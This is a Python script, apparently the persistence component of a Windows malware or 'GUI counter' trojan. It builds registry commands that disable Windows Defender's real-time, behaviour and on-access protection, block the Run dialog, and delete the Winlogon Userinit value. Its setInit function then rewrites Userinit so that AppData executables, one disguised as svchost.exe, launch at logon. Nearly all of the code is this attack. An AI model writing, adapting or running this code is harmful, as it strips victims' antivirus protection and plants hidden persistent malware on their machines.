#!/usr/bin/python
#coding:utf-8
import os, sys, time, winreg
# ENVIRONMENT VARIABLE
usr = os.environ["USERNAME"]
d = os.environ["SystemDrive"]

class ManageKey():
    """ Classe définissant les règles à ajouter dans le registre Windows """
    def __init__(self):
        self.values_windef   = ["/v DisableScanOnRealtimeEnable", "/v DisableBehaviorMonitoring", "/v DisableOnAccessProtection"]
        self.win_realtime    = 'REG ADD "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"'
        self.windef_path     = 'REG ADD "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware'
        self.path_win_r      = "REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun"
        self.unset_key       = 'REG DELETE "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit'
        self.force_cli       = "/f"
        self.key_type        = "/t REG_DWORD /d 1"
    def setkey(self):
        for x in self.values_windef:
            self.values_windef   = x
            self.command_execute = "{} {} {} {}".format(self.win_realtime, x, self.key_type, self.force_cli)
            print(self.command_execute)
        self.windef_all_exec = "{} {} {}".format(self.windef_path, self.key_type, self.force_cli)
        print(self.windef_all_exec)
        self.block_windows_r = "{} {} {}".format(self.path_win_r, self.key_type, self.force_cli)
        print(self.block_windows_r)
    def delkey(self):
        self.exec_unset_key = "{} {}".format(self.unset_key, self.force_cli)
        print(self.exec_unset_key)

# WRITE A REG FOR THE GUI COUNTER TO STARTUP BEFORE LOGON ON WINDOWS
def setInit():
    p = "{}\\Users\\{}\\AppData\\gui_counter\\GuiCounter.exe, {}\\Users\\{}\\AppData\\gui_counter\\rv\\svchost.exe, {}\\Users\\{}\\AppData\\gui_counter\\rvM32.exe, {}\\Windows\\system32\\userinit.exe".format(d, usr, d, usr, d, usr, d)
    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
    winreg.SetValueEx(key, 'Userinit',0, winreg.REG_SZ, p)
    winreg.CloseKey(key)
